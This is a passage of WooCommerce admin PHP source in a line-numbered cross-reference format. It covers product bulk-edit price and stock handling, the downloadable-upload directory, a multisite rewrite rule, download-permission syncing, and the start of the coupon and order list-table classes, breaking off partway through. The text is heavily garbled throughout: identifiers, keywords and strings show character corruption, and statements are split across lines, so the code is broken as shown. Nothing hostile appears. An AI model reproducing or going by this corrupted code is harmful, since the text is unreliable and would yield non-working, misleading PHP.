$§Ë_´iû
, '%' ) ) {

1012 
$³rûÁ
 = 
	`¡r_»¶aû
Ğ'%', '', 
$§Ë_´iû
 ) / 100;

1013 
$Ãw_´iû
 = 
$Şd_§Ë_´iû
 - ( $Şd_§Ë_´iû * 
$³rûÁ
 );

1015 
$Ãw_´iû
 = 
$Şd_§Ë_´iû
 - 
$§Ë_´iû
;

1019 iàĞ
	`¡r¡r
Ğ
$§Ë_´iû
, '%' ) ) {

1020 
$³rûÁ
 = 
	`¡r_»¶aû
Ğ'%', '', 
$§Ë_´iû
 ) / 100;

1021 
$Ãw_´iû
 = 
$´oduù
->
»guÏr_´iû
 - ( $´oduù->»guÏr_´iû * 
$³rûÁ
 );

1023 
$Ãw_´iû
 = 
$´oduù
->
»guÏr_´iû
 - 
$§Ë_´iû
;

1031 iàĞ
	`is£t
Ğ
$Ãw_´iû
 ) && $Ãw_´iû !ğ
$Şd_§Ë_´iû
 ) {

1032 
$´iû_chªged
 = 
Œue
;

1033 
$Ãw_´iû
 = 
	`round
Ğ$Ãw_´iû, 
	`absšt
Ğ
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) ) );

1034 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_§Ë_´iû', 
$Ãw_´iû
 );

1035 
$´oduù
->
§Ë_´iû
 = 
$Ãw_´iû
;

1039 iàĞ
$´iû_chªged
 ) {

1040 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price_dates_from', '' );

1041 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price_dates_to', '' );

1043 iàĞ
$´oduù
->
»guÏr_´iû
 < $´oduù->
§Ë_´iû
 ) {

1044 
$´oduù
->
§Ë_´iû
 = '';

1045 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price', '' );

1048 iàĞ
$´oduù
->
§Ë_´iû
 ) {

1049 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´iû', 
$´oduù
->
§Ë_´iû
 );

1051 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´iû', 
$´oduù
->
»guÏr_´iû
 );

1057 iàĞ! 
$´oduù
->
	`is_ty³
( 'grouped' ) ) {

1059 iàĞ! 
	`em±y
Ğ
$_REQUEST
['change_stock'] ) ) {

1060 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_manage_stock', 'yes' );

1061 
	`wc_upd©e_´oduù_¡ock
Ğ
$po¡_id
, 
	`štv®
Ğ
$_REQUEST
['_stock'] ) );

1064 iàĞ! 
	`em±y
Ğ
$_REQUEST
['_manage_stock'] ) ) {

1066 iàĞ
$_REQUEST
['_manage_stock'] == 'yes' ) {

1067 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_manage_stock', 'yes' );

1069 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_manage_stock', 'no' );

1070 
	`wc_upd©e_´oduù_¡ock
Ğ
$po¡_id
, 0 );

1074 iàĞ! 
	`em±y
Ğ
$_REQUEST
['_backorders'] ) ) {

1075 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_backÜd”s', 
	`wc_ş—n
Ğ
$_REQUEST
['_backorders'] ) );

1080 
	`do_aùiÚ
Ğ'woocomm”û_´oduù_bulk_ed™_§ve', 
$´oduù
 );

1081 
	}
}

1089 
public
 
funùiÚ
 
	$u¶ßd_dœ
Ğ
$·thd©a
 ) {

1091 iàĞ
	`is£t
Ğ
$_POST
['type'] ) && 'downloadable_product' == $_POST['type'] ) {

1092 iàĞ
	`em±y
Ğ
$·thd©a
['subdir'] ) ) {

1093 
$·thd©a
['path'] = $pathdata['path'] . '/woocommerce_uploads';

1094 
$·thd©a
['url'] = $pathdata['url']. '/woocommerce_uploads';

1095 
$·thd©a
['subdir'] = '/woocommerce_uploads';

1097 
$Ãw_subdœ
 = '/woocomm”û_u¶ßds' . 
$·thd©a
['subdir'];

1099 
$·thd©a
['·th'] = 
	`¡r_»¶aû
Ğ$·thd©a['subdœ'], 
$Ãw_subdœ
, $pathdata['path'] );

1100 
$·thd©a
['u¾'] = 
	`¡r_»¶aû
Ğ$·thd©a['subdœ'], 
$Ãw_subdœ
, $pathdata['url'] );

1101 
$·thd©a
['subdœ'] = 
	`¡r_»¶aû
Ğ$·thd©a['subdœ'], 
$Ãw_subdœ
, $pathdata['subdir'] );

1105  
$·thd©a
;

1106 
	}
}

1111 
public
 
funùiÚ
 
	$woocomm”û_medŸ_u¶ßd_dowÆßdabË_´oduù
() {

1112 
	`do_aùiÚ
( 'media_upload_file' );

1113 
	}
}

1121 
public
 
funùiÚ
 
	$ms_´Ùeù_dowÆßd_»w™e_ruËs
Ğ
$»wr™e
 ) {

1122 
glob®
 
$wp_»wr™e
;

1124 iàĞ! 
	`is_muÉis™e
(è|| '»dœeù' =ğ
	`g‘_İtiÚ
( 'woocommerce_file_download_method' ) ) {

1125  
$»wr™e
;

1128 
$ruË
 = "\n# WooCommerce Rules - Protect Files from ms-files.php\n\n";

1129 
$ruË
 .= "<IfModule mod_rewrite.c>\n";

1130 
$ruË
 .= "RewriteEngine On\n";

1131 
$ruË
 .= "RewriteCond %{QUERY_STRING} file=woocommerce_uploads/ [NC]\n";

1132 
$ruË
 .= "RewriteRule /ms-files.php$ - [F]\n";

1133 
$ruË
 .= "</IfModule>\n\n";

1135  
$ruË
 . 
$»wr™e
;

1136 
	}
}

1146 
public
 
funùiÚ
 
	$´oûss_´oduù_fe_dowÆßd_·ths
Ğ
$´oduù_id
, 
$v¬ŸtiÚ_id
, 
$dowÆßdabË_fes
 ) {

1147 
glob®
 
$wpdb
;

1149 iàĞ
$v¬ŸtiÚ_id
 ) {

1150 
$´oduù_id
 = 
$v¬ŸtiÚ_id
;

1153 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

1154 
$exi¡šg_dowÆßd_ids
 = 
	`¬¿y_keys
Ğ(
¬¿y
è
$´oduù
->
	`g‘_fes
() );

1155 
$upd©ed_dowÆßd_ids
 = 
	`¬¿y_keys
Ğ(
¬¿y
è
$dowÆßdabË_fes
 );

1157 
$Ãw_dowÆßd_ids
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_diff
Ğ
$upd©ed_dowÆßd_ids
, 
$exi¡šg_dowÆßd_ids
 ) );

1158 
$»moved_dowÆßd_ids
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_diff
Ğ
$exi¡šg_dowÆßd_ids
, 
$upd©ed_dowÆßd_ids
 ) );

1160 iàĞ
$Ãw_dowÆßd_ids
 || 
$»moved_dowÆßd_ids
 ) {

1162 
$exi¡šg_³rmissiÚs
 = 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
Ğ"SELECT * from {$wpdb->´efix}woocomm”û_dowÆßdabË_´oduù_³rmissiÚ WHERE…roduù_id = %d GROUP BY ord”_id", 
$´oduù_id
 ) );

1164 
	`fÜ—ch
 ( 
$exi¡šg_³rmissiÚs
 
as
 
$exi¡šg_³rmissiÚ
 ) {

1165 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$exi¡šg_³rmissiÚ
->
Üd”_id
 );

1167 iàĞ
$Üd”
->
id
 ) {

1169 iàĞ
$»moved_dowÆßd_ids
 ) {

1170 
	`fÜ—ch
 ( 
$»moved_dowÆßd_ids
 
as
 
$dowÆßd_id
 ) {

1171 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_´oûss_´oduù_fe_dowÆßd_·ths_»move_acûss_to_Şd_fe', 
Œue
, 
$dowÆßd_id
, 
$´oduù_id
, 
$Üd”
 ) ) {

1172 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_dowÆßdabË_´oduù_³rmissiÚ WHERE ord”_id = %d AND…roduù_id = %d AND dowÆßd_id = %s", 
$Üd”
->
id
, 
$´oduù_id
, 
$dowÆßd_id
 ) );

1177 iàĞ
$Ãw_dowÆßd_ids
 ) {

1178 
	`fÜ—ch
 ( 
$Ãw_dowÆßd_ids
 
as
 
$dowÆßd_id
 ) {

1179 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_´oûss_´oduù_fe_dowÆßd_·ths_g¿Á_acûss_to_Ãw_fe', 
Œue
, 
$dowÆßd_id
, 
$´oduù_id
, 
$Üd”
 ) ) {

1181 iàĞ! 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT 1 FROM {$wpdb->´efix}woocomm”û_dowÆßdabË_´oduù_³rmissiÚ WHERE ord”_id = %d AND…roduù_id = %d AND dowÆßd_id = %s", 
$Üd”
->
id
, 
$´oduù_id
, 
$dowÆßd_id
 ) ) ) {

1182 
	`wc_dowÆßdabË_fe_³rmissiÚ
Ğ
$dowÆßd_id
, 
$´oduù_id
, 
$Üd”
 );

1190 
	}
}

1193 
	g’dif
;

1195  
Ãw
 
WC_Admš_CPT_Produù
();

	@includes/admin/post-types/class-wc-admin-cpt-shop_coupon.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_CPT' ) )

14 
šşude
( 'class-wc-admin-cpt.php' );

16 iàĞ! 
şass_exi¡s
( 'WC_Admin_CPT_Shop_Coupon' ) ) :

21 şas 
	cWC_Admš_CPT_Shİ_CoupÚ
 
ex‹nds
 
WC_Admš_CPT
 {

26 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

27 
$this
->
ty³
 = 'shop_coupon';

30 
	`add_f‹r
Ğ'’‹r_t™Ë_h”e', 
	`¬¿y
Ğ
$this
, 'enter_title_here' ), 1, 2 );

31 
	`add_aùiÚ
Ğ'ed™_fÜm_aá”_t™Ë', 
	`¬¿y
Ğ
$this
, 'coupon_description_field' ) );

34 
	`add_f‹r
Ğ'mªage_ed™-shİ_coupÚ_cŞumns', 
	`¬¿y
Ğ
$this
, 'edit_columns' ) );

35 
	`add_aùiÚ
Ğ'mªage_shİ_coupÚ_po¡s_cu¡om_cŞumn', 
	`¬¿y
Ğ
$this
, 'custom_columns' ), 2 );

36 
	`add_f‹r
Ğ'»que¡', 
	`¬¿y
Ğ
$this
, 'coupons_by_type_query' ) );

39 
	`add_aùiÚ
Ğ'»¡riù_mªage_po¡s', 
	`¬¿y
Ğ
$this
, 'coupon_filters' ) );

42 
·»Á
::
	`__cÚ¡ruù
();

51 
public
 
funùiÚ
 
	$’‹r_t™Ë_h”e
Ğ
$‹xt
, 
$po¡
 ) {

52 iàĞ
$po¡
->
po¡_ty³
 == 'shop_coupon' )

53  
	`__
( 'Coupon code', 'woocommerce' );

55  
$‹xt
;

56 
	}
}

62 
public
 
funùiÚ
 
	$coupÚ_desütiÚ_f›ld
Ğ
$po¡
 ) {

63 iàĞ
$po¡
->
po¡_ty³
 != 'shop_coupon' )

66 <
‹x»a
 
id
="woocomm”û-coupÚ-desütiÚ" 
Çme
="exû½t" 
cŞs
="5" 
rows
="2" 
¶aûhŞd”
="<?ph°esc_©Œ_eĞ'DesütiÚ (İtiÚ®)', 'woocomm”û' ); ?>"><?
php
 
echo
 
	`esc_‹x»a
Ğ
$po¡
->
po¡_exû½t
 ); ?></textarea>

67 <?
php


68 
	}
}

73 
public
 
funùiÚ
 
	$ed™_cŞumns
Ğ
$cŞumns
 ) {

74 
$cŞumns
 = 
	`¬¿y
();

76 
$cŞumns
["cb"] = "<inputype=\"checkbox\" />";

77 
$cŞumns
["coupÚ_code"] = 
	`__
( 'Code', 'woocommerce' );

78 
$cŞumns
["ty³"] = 
	`__
( 'Couponype', 'woocommerce' );

79 
$cŞumns
["amouÁ"] = 
	`__
( 'Coupon‡mount', 'woocommerce' );

80 
$cŞumns
["desütiÚ"] = 
	`__
( 'Description', 'woocommerce' );

81 
$cŞumns
["´oduùs"] = 
	`__
( 'Product IDs', 'woocommerce' );

82 
$cŞumns
["u§ge"] = 
	`__
( 'Usage / Limit', 'woocommerce' );

83 
$cŞumns
["expœy_d©e"] = 
	`__
( 'Expiry date', 'woocommerce' );

85  
$cŞumns
;

86 
	}
}

92 
public
 
funùiÚ
 
	$cu¡om_cŞumns
Ğ
$cŞumn
 ) {

93 
glob®
 
$po¡
, 
$woocomm”û
;

95  
$cŞumn
 ) {

97 
$ed™_lšk
 = 
	`g‘_ed™_po¡_lšk
Ğ
$po¡
->
ID
 );

98 
$t™Ë
 = 
	`_d¿á_Ü_po¡_t™Ë
();

99 
$po¡_ty³_objeù
 = 
	`g‘_po¡_ty³_objeù
Ğ
$po¡
->
po¡_ty³
 );

100 
$ÿn_ed™_po¡
 = 
	`cu¼’t_u£r_ÿn
Ğ
$po¡_ty³_objeù
->
ÿp
->
ed™_po¡
, 
$po¡
->
ID
 );

102 
echo
 '<div cÏss="codts" d©a-t="' . 
	`__
Ğ'Ed™ coupÚ', 'woocomm”û' ) . '"><¨h»f="' . 
	`esc_©Œ
Ğ
$ed™_lšk
 ) . '"><¥ª>' . 
	`esc_html
Ğ
$t™Ë
 ). '</span></a></div>';

104 
	`_po¡_¡©es
Ğ
$po¡
 );

107 
$aùiÚs
 = 
	`¬¿y
();

109 iàĞ
	`cu¼’t_u£r_ÿn
Ğ
$po¡_ty³_objeù
->
ÿp
->
d–‘e_po¡
, 
$po¡
->
ID
 ) ) {

110 iàĞ'Œash' =ğ
$po¡
->
po¡_¡©us
 )

111 
$aùiÚs
['uÁ¿sh'] = "<¨t™Ë='" . 
	`esc_©Œ
Ğ
	`__
Ğ'Re¡Üthi ™em fromhT¿sh', 'woocomm”û' ) ) . "' h»f='" . 
	`wp_nÚû_u¾
Ğ
	`admš_u¾
Ğ
	`¥rštf
Ğ
$po¡_ty³_objeù
->
_ed™_lšk
 . '&amp;aùiÚ=uÁ¿sh', 
$po¡
->
ID
 ) ), 'untrash-post_' . $post->ID ) . "'>" . __( 'Restore', 'woocommerce' ) . "</a>";

112 
	`–£if
 ( 
EMPTY_TRASH_DAYS
 )

113 
$aùiÚs
['Œash'] = "<¨şass='subm™d–‘e'™Ë='" . 
	`esc_©Œ
Ğ
	`__
Ğ'Movthi ™emØthT¿sh', 'woocomm”û' ) ) . "' h»f='" . 
	`g‘_d–‘e_po¡_lšk
Ğ
$po¡
->
ID
 ) . "'>" . __( 'Trash', 'woocommerce' ) . "</a>";

114 iàĞ'Œash' =ğ
$po¡
->
po¡_¡©us
 || !
EMPTY_TRASH_DAYS
 )

115 
$aùiÚs
['d–‘e'] = "<¨şass='subm™d–‘e'™Ë='" . 
	`esc_©Œ
Ğ
	`__
Ğ'D–‘thi ™em…”mª’y', 'woocomm”û' ) ) . "' h»f='" . 
	`g‘_d–‘e_po¡_lšk
Ğ
$po¡
->
ID
, '', 
Œue
 ) . "'>" . __( 'Delete Permanently', 'woocommerce' ) . "</a>";

118 
$aùiÚs
 = 
	`­¶y_f‹rs
Ğ'po¡_row_aùiÚs', $aùiÚs, 
$po¡
 );

120 
echo
 '<div class="row-actions">';

122 
$i
 = 0;

123 
$aùiÚ_couÁ
 = (
$aùiÚs
);

125 
	`fÜ—ch
 ( 
$aùiÚs
 
as
 
$aùiÚ
 => 
$lšk
 ) {

126 ++
$i
;

127 Ğ
$i
 =ğ
$aùiÚ_couÁ
 ) ? 
$£p
 = '' : $sep = ' | ';

128 
echo
 "<span class='$action'>$link$sep</span>";

130 
echo
 '</div>';

134 
echo
 
	`esc_html
Ğ
	`wc_g‘_coupÚ_ty³
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, 'discouÁ_ty³', 
Œue
 ) ) );

137 
echo
 
	`esc_html
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, 'coupÚ_amouÁ', 
Œue
 ) );

140 
$´oduù_ids
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '´oduù_ids', 
Œue
 );

141 
$´oduù_ids
 = $´oduù_id ? 
	`¬¿y_m­
Ğ'absšt', 
	`ex¶ode
Ğ',', $´oduù_id èè: 
	`¬¿y
();

142 iàĞĞ
$´oduù_ids
 ) > 0 )

143 
echo
 
	`esc_html
Ğ
	`im¶ode
Ğ', ', 
$´oduù_ids
 ) );

145 
echo
 '&ndash;';

148 
$u§ge_lim™
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, 'u§ge_lim™', 
Œue
 );

150 iàĞ
$u§ge_lim™
 )

151 
echo
 
	`esc_html
Ğ
$u§ge_lim™
 );

153 
echo
 '&ndash;';

156 
$u§ge_couÁ
 = 
	`absšt
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, 'u§ge_couÁ', 
Œue
 ) );

157 
$u§ge_lim™
 = 
	`esc_html
Ğ
	`g‘_po¡_m‘a
(
$po¡
->
ID
, 'u§ge_lim™', 
Œue
) );

159 iàĞ
$u§ge_lim™
 )

160 
	`´štf
Ğ
	`__
Ğ'% / %s', 'woocomm”û' ), 
$u§ge_couÁ
, 
$u§ge_lim™
 );

162 
	`´štf
Ğ
	`__
Ğ'% / &šfš;', 'woocomm”û' ), 
$u§ge_couÁ
 );

165 
$expœy_d©e
 = 
	`g‘_po¡_m‘a
(
$po¡
->
ID
, 'expœy_d©e', 
Œue
);

167 iàĞ
$expœy_d©e
 )

168 
echo
 
	`esc_html
Ğ
	`d©e_i18n
Ğ'F j, Y', 
	`¡¹Ùime
Ğ
$expœy_d©e
 ) ) );

170 
echo
 '&ndash;';

173 
echo
 
	`wp_k£s_po¡
Ğ
$po¡
->
po¡_exû½t
 );

176 
	}
}

184 
public
 
funùiÚ
 
	$coupÚs_by_ty³_qu”y
Ğ
$v¬s
 ) {

185 
glob®
 
$ty³now
, 
$wp_qu”y
;

186 iàĞ
$ty³now
 =ğ'shİ_coupÚ' && ! 
	`em±y
Ğ
$_GET
['coupon_type'] ) ) {

188 
$v¬s
['meta_key'] = 'discount_type';

189 
$v¬s
['m‘a_v®ue'] = 
	`wc_ş—n
Ğ
$_GET
['coupon_type'] );

193  
$v¬s
;

194 
	}
}

199 
public
 
funùiÚ
 
	$coupÚ_f‹rs
() {

200 
glob®
 
$woocomm”û
, 
$ty³now
, 
$wp_qu”y
;

202 iàĞ
$ty³now
 != 'shop_coupon' )

207 <
£Ëù
 
Çme
='coupÚ_ty³' 
id
='dropdown_shop_coupon_type'>

208 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Show‡llypes', 'woocommerce' ); ?></option>

209 <?
php


210 
$ty³s
 = 
	`wc_g‘_coupÚ_ty³s
();

212 
	`fÜ—ch
 ( 
$ty³s
 
as
 
$Çme
 => 
$ty³
 ) {

213 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$Çme
 ) . '"';

215 iàĞ
	`is£t
Ğ
$_GET
['coupon_type'] ) )

216 
	`£Ëùed
Ğ
$Çme
, 
$_GET
['coupon_type'] );

218 
echo
 '>' . 
	`esc_html__
Ğ
$ty³
, 'woocommerce' ) . '</option>';

221 </
£Ëù
>

222 <?
php


224 
	`wc_’queue_js
( "

225 
	`jQu”y
('£Ëù#drİdown_shİ_coupÚ_ty³, s–eù[Çme=m]').
	`css
('width', '150px').
	`cho£n
();

227 
	}
}

230 
	g’dif
;

232  
Ãw
 
WC_Admš_CPT_Shİ_CoupÚ
();

	@includes/admin/post-types/class-wc-admin-cpt-shop_order.php

1 <?
php


12 iàĞ! 
defšed
( 'ABSPATH' ) ) {

13 
	gex™
;

16 iàĞ! 
şass_exi¡s
( 'WC_Admin_CPT' ) ) {

17 
šşude
( 'class-wc-admin-cpt.php' );

20 iàĞ! 
şass_exi¡s
( 'WC_Admin_CPT_Shop_Order' ) ) :

25 şas 
	cWC_Admš_CPT_Shİ_Ord”
 
ex‹nds
 
WC_Admš_CPT
 {

30 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

31 
$this
->
ty³
 = 'shop_order';

34 
	`add_f‹r
Ğ'wp_š£¹_po¡_d©a', 
	`¬¿y
Ğ
$this
, 'wp_insert_post_data' ) );

37 
	`add_f‹r
Ğ'mªage_ed™-' . 
$this
->
ty³
 . '_cŞumns', 
	`¬¿y
( $this, 'edit_columns' ) );

38 
	`add_aùiÚ
Ğ'mªage_' . 
$this
->
ty³
 . '_po¡s_cu¡om_cŞumn', 
	`¬¿y
( $this, 'custom_columns' ), 2 );

41 
	`add_f‹r
Ğ'v›ws_ed™-shİ_Üd”', 
	`¬¿y
Ğ
$this
, 'custom_order_views' ) );

42 
	`add_f‹r
Ğ'bulk_aùiÚs-ed™-shİ_Üd”', 
	`¬¿y
Ğ
$this
, 'bulk_actions' ) );

43 
	`add_f‹r
Ğ'po¡_row_aùiÚs', 
	`¬¿y
Ğ
$this
, 'remove_row_actions' ), 10, 1 );

44 
	`add_aùiÚ
Ğ'»¡riù_mªage_po¡s', 
	`¬¿y
Ğ
$this
, 'restrict_manage_orders' ) );

45 
	`add_f‹r
Ğ'»que¡', 
	`¬¿y
Ğ
$this
, 'orders_by_customer_query' ) );

46 
	`add_f‹r
Ğ"mªage_ed™-shİ_Üd”_sÜbË_cŞumns", 
	`¬¿y
Ğ
$this
, 'custom_shop_order_sort' ) );

47 
	`add_f‹r
Ğ'»que¡', 
	`¬¿y
Ğ
$this
, 'custom_shop_order_orderby' ) );

48 
	`add_f‹r
Ğ'g‘_£¬ch_qu”y', 
	`¬¿y
Ğ
$this
, 'shop_order_search_label' ) );

49 
	`add_f‹r
Ğ'qu”y_v¬s', 
	`¬¿y
Ğ
$this
, 'add_custom_query_var' ) );

50 
	`add_aùiÚ
Ğ'·r£_qu”y', 
	`¬¿y
Ğ
$this
, 'shop_order_search_custom_fields' ) );

51 
	`add_aùiÚ
Ğ'befÜe_d–‘e_po¡', 
	`¬¿y
Ğ
$this
, 'delete_order_items' ) );

54 
	`add_aùiÚ
Ğ'admš_foÙ”', 
	`¬¿y
Ğ
$this
, 'bulk_admin_footer' ), 10 );

55 
	`add_aùiÚ
Ğ'lßd-ed™.php', 
	`¬¿y
Ğ
$this
, 'bulk_action' ) );

56 
	`add_aùiÚ
Ğ'admš_nÙiûs', 
	`¬¿y
Ğ
$this
, 'bulk_admin_notices' ) );

59 
·»Á
::
	`__cÚ¡ruù
();

68 
public
 
funùiÚ
 
	$wp_š£¹_po¡_d©a
Ğ
$d©a
 ) {

69 
glob®
 
$po¡
;

71 iàĞ
$d©a
['po¡_ty³'] =ğ'shİ_Üd”' && 
	`is£t
( $data['post_date'] ) ) {

73 
$Üd”_t™Ë
 = 'Order';

74 iàĞ
$d©a
['post_date'] ) {

75 
$Üd”_t™Ë
.ğ' &ndash; ' . 
	`d©e_i18n
Ğ'F j, Y @ h:˜A', 
	`¡¹Ùime
Ğ
$d©a
['post_date'] ) );

78 
$d©a
['po¡_t™Ë'] = 
$Üd”_t™Ë
;

81  
$d©a
;

82 
	}
}

87 
public
 
funùiÚ
 
	$ed™_cŞumns
Ğ
$exi¡šg_cŞumns
 ) {

88 
$cŞumns
 = 
	`¬¿y
();

90 
$cŞumns
['cb'] = '<inputype="checkbox" />';

91 
$cŞumns
['Üd”_¡©us'] = '<¥ª cÏss="¡©us_h—ds" d©a-t="' . 
	`esc_©Œ__
( 'Status', 'woocommerce' ) . '">' .ƒsc_attr__( 'Status', 'woocommerce' ) . '</span>';

92 
$cŞumns
['Üd”_t™Ë'] = 
	`__
( 'Order', 'woocommerce' );

93 
$cŞumns
['Üd”_™ems'] = 
	`__
( 'Purchased', 'woocommerce' );

94 
$cŞumns
['shpšg_add»ss'] = 
	`__
( 'Shipo', 'woocommerce' );

96 
$cŞumns
['cu¡om”_mes§ge'] = '<¥ª cÏss="nÙes_h—ds" d©a-t="' . 
	`esc_©Œ__
( 'Customer Message', 'woocommerce' ) . '">' .ƒsc_attr__( 'Customer Message', 'woocommerce' ) . '</span>';

97 
$cŞumns
['Üd”_nÙes'] = '<¥ª cÏss="Üd”-nÙes_h—ds" d©a-t="' . 
	`esc_©Œ__
( 'Order Notes', 'woocommerce' ) . '">' .ƒsc_attr__( 'Order Notes', 'woocommerce' ) . '</span>';

98 
$cŞumns
['Üd”_d©e'] = 
	`__
( 'Date', 'woocommerce' );

99 
$cŞumns
['Üd”_tÙ®'] = 
	`__
( 'Total', 'woocommerce' );

100 
$cŞumns
['Üd”_aùiÚs'] = 
	`__
( 'Actions', 'woocommerce' );

102  
$cŞumns
;

103 
	}
}

109 
public
 
funùiÚ
 
	$cu¡om_cŞumns
Ğ
$cŞumn
 ) {

110 
glob®
 
$po¡
, 
$woocomm”û
, 
$the_Üd”
;

112 iàĞ
	`em±y
Ğ
$the_Üd”
 ) || $the_Üd”->
id
 !ğ
$po¡
->
ID
 ) {

113 
$the_Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$po¡
->
ID
 );

116  
$cŞumn
 ) {

119 
	`´štf
Ğ'<m¬k cÏss="% ts" d©a-t="%s">%s</m¬k>', 
	`§n™ize_t™Ë
Ğ
$the_Üd”
->
¡©us
 ), 
	`esc_html__
( $the_order->status, 'woocommerce' ),ƒsc_html__( $the_order->status, 'woocommerce' ) );

124 iàĞ'0000-00-00 00:00:00' =ğ
$po¡
->
po¡_d©e
 ) {

125 
$t_time
 = 
$h_time
 = 
	`__
( 'Unpublished', 'woocommerce' );

127 
$t_time
 = 
	`g‘_the_time
Ğ
	`__
Ğ'Y/m/d g:i: A', 'woocomm”û' ), 
$po¡
 );

128 
$gmt_time
 = 
	`¡¹Ùime
Ğ
$po¡
->
po¡_d©e_gmt
 . ' UTC' );

129 
$time_diff
 = 
	`cu¼’t_time
Ğ'time¡amp', 1 ) - 
$gmt_time
;

130 
$h_time
 = 
	`g‘_the_time
Ğ
	`__
Ğ'Y/m/d', 'woocomm”û' ), 
$po¡
 );

133 
echo
 '<abb¸t™Ë="' . 
	`esc_©Œ
Ğ
$t_time
 ) . '">' . 
	`esc_html
Ğ
	`­¶y_f‹rs
Ğ'po¡_d©e_cŞumn_time', 
$h_time
, 
$po¡
 ) ) . '</abbr>';

138 iàĞ
$the_Üd”
->
cu¡om”_mes§ge
 )

139 
echo
 '<¥ª cÏss="nÙe-Ús" d©a-t="' . 
	`esc_©Œ
Ğ
$the_Üd”
->
cu¡om”_mes§ge
 ) . '">' . 
	`__
( 'Yes', 'woocommerce' ) . '</span>';

141 
echo
 '<span class="na">&ndash;</span>';

145 iàĞ
$the_Üd”
->
	`g‘_fÜm©‹d_blšg_add»ss
() )

146 
echo
 '<¨rg‘="_bÏnk" h»f="' . 
	`esc_u¾
Ğ'h‰p://m­s.googË.com/m­s?&q=' . 
	`u¾’code
Ğ
$the_Üd”
->
	`g‘_blšg_add»ss
(èè. '&z=16' ) . '">' . 
	`esc_html
Ğ
	`´eg_»¶aû
Ğ'#<br\s*/?>#i', ', ', $the_Üd”->
	`g‘_fÜm©‹d_blšg_add»ss
() ) ) .'</a>';

148 
echo
 '&ndash;';

150 iàĞ
$the_Üd”
->
·ym’t_m‘hod_t™Ë
 )

151 
echo
 '<sm®Èşass="m‘a">' . 
	`__
Ğ'VŸ', 'woocomm”û' ) . ' ' . 
	`esc_html
Ğ
$the_Üd”
->
·ym’t_m‘hod_t™Ë
 ) . '</small>';

155 
	`´štf
Ğ'<¨h»f="#" cÏss="show_Üd”_™ems">' . 
	`_n
Ğ'%d i‹m', '%d i‹ms', Ğ
$the_Üd”
->
	`g‘_™ems
() ), 'woocommerce' ) . '</a>', ( $the_order->get_items() ) );

157 iàĞĞ
$the_Üd”
->
	`g‘_™ems
() ) > 0 ) {

159 
echo
 '<table class="order_items" cellspacing="0">';

161 
	`fÜ—ch
 ( 
$the_Üd”
->
	`g‘_™ems
(è
as
 
$™em
 ) {

162 
$_´oduù
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_´oduù', 
$the_Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 ), $item );

163 
$™em_m‘a
 = 
Ãw
 
	`WC_Ord”_I‹m_M‘a
Ğ
$™em
['item_meta'] );

164 
$™em_m‘a_html
 = 
$™em_m‘a
->
	`di¥Ïy
Ğ
Œue
,rue );

166 <
Œ
>

167 <
td
 
şass
="qty"><?
php
 
echo
 
	`absšt
Ğ
$™em
['qty'] ); ?></td>

168 <
td
 
şass
="name">

169 <?
php
 iàĞ
	`wc_´oduù_sku_’abËd
(è&& 
$_´oduù
 && $_´oduù->
	`g‘_sku
(èè
echo
 $_´oduù->g‘_sku(è. ' - '; ?><?ph°echØ
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_Çme', 
$™em
['name'], $item ); ?>

170 <?
php
 iàĞ
$™em_m‘a_html
 ) : ?>

171 <
a
 
şass
="ts" 
h»f
="#" 
d©a
-
t
="<?phpƒchoƒsc_attr( $item_meta_html ); ?>">[?]</a>

172 <?
php
 
’dif
; ?>

173 </
td
>

174 </
Œ
>

175 <?
php


178 
echo
 '</table>';

180 } 
echo
 '&ndash;';

183 iàĞ
$the_Üd”
->
	`g‘_fÜm©‹d_shpšg_add»ss
() )

184 
echo
 '<¨rg‘="_bÏnk" h»f="' . 
	`esc_u¾
Ğ'h‰p://m­s.googË.com/m­s?&q=' . 
	`u¾’code
Ğ
$the_Üd”
->
	`g‘_shpšg_add»ss
(èè. '&z=16' ) . '">'. 
	`esc_html
Ğ
	`´eg_»¶aû
Ğ'#<br\s*/?>#i', ', ', $the_Üd”->
	`g‘_fÜm©‹d_shpšg_add»ss
() ) ) .'</a>';

186 
echo
 '&ndash;';

188 iàĞ
$the_Üd”
->
	`g‘_shpšg_m‘hod
() )

189 
echo
 '<sm®Èşass="m‘a">' . 
	`__
Ğ'VŸ', 'woocomm”û' ) . ' ' . 
	`esc_html
Ğ
$the_Üd”
->
